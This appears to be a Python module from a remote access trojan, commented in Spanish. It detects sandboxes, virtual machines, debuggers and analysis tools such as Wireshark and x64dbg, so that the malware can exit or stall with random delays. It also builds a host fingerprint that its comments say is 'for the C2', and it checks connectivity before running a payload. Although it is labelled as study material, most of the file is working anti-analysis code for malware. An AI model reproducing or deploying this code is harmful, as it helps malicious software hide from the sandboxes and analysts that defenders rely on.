"""
Módulo de verificación de entorno - Detección de sandbox/análisis
Propósito: Entender técnicas de evasión usadas por malware real
"""

import os
import ctypes
import time
import random
from datetime import datetime


class EnvironmentChecker:
    """
    Clase 1: Verificación de entorno
    Detecta si el código se ejecuta en entorno de análisis (sandbox, VM, debugger)
    """
    
    def __init__(self):
        self.is_sandbox = False
        self.is_vm = False
        self.is_debugged = False
        self.indicators = []
    
    def check_sandbox_indicators(self):
        """
        Detecta indicadores comunes de sandbox
        """
        checks = {
            'username': self._check_username(),
            'hostname': self._check_hostname(),
            'processes': self._check_running_processes(),
            'files': self._check_sandbox_files(),
            'memory': self._check_memory(),
            'uptime': self._check_uptime(),
            'mouse': self._check_mouse_activity(),
            'cpu_cores': self._check_cpu_cores()
        }
        
        for check_name, result in checks.items():
            if result:
                self.indicators.append(f"sandbox:{check_name}")
                self.is_sandbox = True
        
        return self.is_sandbox
    
    def _check_username(self):
        """Nombres de usuario típicos de sandbox"""
        sandbox_users = ['sandbox', 'virus', 'malware', 'test', 'admin', 'user', 'vm']
        current_user = os.getenv('USERNAME', '').lower()
        return any(user in current_user for user in sandbox_users)
    
    def _check_hostname(self):
        """Nombres de equipo típicos de VMs"""
        sandbox_hosts = ['sandbox', 'cuckoo', 'virus', 'malware', 'sample', 'test']
        hostname = os.getenv('COMPUTERNAME', '').lower()
        return any(host in hostname for host in sandbox_hosts)
    
    def _check_running_processes(self):
        """
        Detecta procesos de análisis/sandbox
        """
        analysis_tools = [
            'wireshark.exe', 'procmon.exe', 'processhacker.exe',
            'autoruns.exe', 'autorunsc.exe', 'filemon.exe',
            'regmon.exe', 'procexp.exe', 'idaq.exe', 'x32dbg.exe',
            'x64dbg.exe', 'ollydbg.exe', 'immunitydebugger.exe',
            'dnspy.exe', 'devenv.exe', 'httpdebugger.exe'
        ]
        
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in analysis_tools:
                    return True
        except:
            pass
        
        return False
    
    def _check_sandbox_files(self):
        """Verifica archivos típicos de sandbox"""
        sandbox_paths = [
            r"C:\analysis",
            r"C:\sandbox",
            r"C:\cuckoo",
            r"C:\virustotal"
        ]
        return any(os.path.exists(path) for path in sandbox_paths)
    
    def _check_memory(self):
        """Verifica RAM mínima (sandboxes suelen tener poca)"""
        try:
            import psutil
            ram_gb = psutil.virtual_memory().total / (1024**3)
            return ram_gb < 2  # Menos de 2GB es sospechoso
        except:
            return False
    
    def _check_uptime(self):
        """Sandboxes suelen tener uptime muy bajo"""
        try:
            class LASTINPUTINFO(ctypes.Structure):
                _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]
            
            lii = LASTINPUTINFO()
            lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
            ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
            uptime = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
            return uptime < 60000  # Menos de 1 minuto
        except:
            return False
    
    def _check_mouse_activity(self):
        """Detecta actividad de mouse (sandboxes no tienen interacción humana)"""
        try:
            class POINT(ctypes.Structure):
                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
            
            pt1 = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt1))
            time.sleep(0.5)
            pt2 = POINT()
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt2))
            
            return pt1.x == pt2.x and pt1.y == pt2.y
        except:
            return False
    
    def _check_cpu_cores(self):
        """Sandboxes suelen tener pocos cores"""
        try:
            import multiprocessing
            return multiprocessing.cpu_count() < 2
        except:
            return False
    
    def check_debugger(self):
        """
        Detecta si hay un debugger adjunto
        """
        if ctypes.windll.kernel32.IsDebuggerPresent():
            self.is_debugged = True
            self.indicators.append("debugger:present")
            return True
        
        # Check PEB BeingDebugged flag
        try:
            class PEB(ctypes.Structure):
                pass
            
            # Técnica avanzada de detección
            kernel32 = ctypes.windll.kernel32
            kernel32.CheckRemoteDebuggerPresent.argtypes = [
                ctypes.c_void_p, ctypes.POINTER(ctypes.c_bool)
            ]
            kernel32.CheckRemoteDebuggerPresent.restype = ctypes.c_bool
            
            debugger_present = ctypes.c_bool()
            kernel32.CheckRemoteDebuggerPresent(
                kernel32.GetCurrentProcess(),
                ctypes.byref(debugger_present)
            )
            
            if debugger_present.value:
                self.is_debugged = True
                self.indicators.append("debugger:remote")
                return True
                
        except:
            pass
        
        return self.is_debugged
    
    def get_fingerprint(self):
        """
        Genera fingerprint del entorno para el C2
        """
        import platform
        import socket
        
        return {
            'hostname': socket.gethostname(),
            'platform': platform.platform(),
            'processor': platform.processor(),
            'machine': platform.machine(),
            'username': os.getenv('USERNAME'),
            'is_sandbox': self.is_sandbox,
            'is_vm': self.is_vm,
            'is_debugged': self.is_debugged,
            'indicators': self.indicators,
            'timestamp': datetime.now().isoformat()
        }
    
    def should_exit(self):
        """
        Decide si debe salir basado en los checks
        """
        # Configurable mediante variable de entorno
        return self.is_sandbox and os.getenv('RAT_ALLOW_SANDBOX') != '1'


class EvasionTechniques:
    """
    Técnicas de evasión adicionales para estudio
    """
    
    @staticmethod
    def delay_execution(min_seconds=10, max_seconds=30):
        """
        Delay aleatorio para evadir análisis automático
        """
        delay = random.randint(min_seconds, max_seconds)
        time.sleep(delay)
        return delay
    
    @staticmethod
    def check_internet():
        """
        Verifica conectividad antes de ejecutar payload
        """
        import socket
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return True
        except:
            return False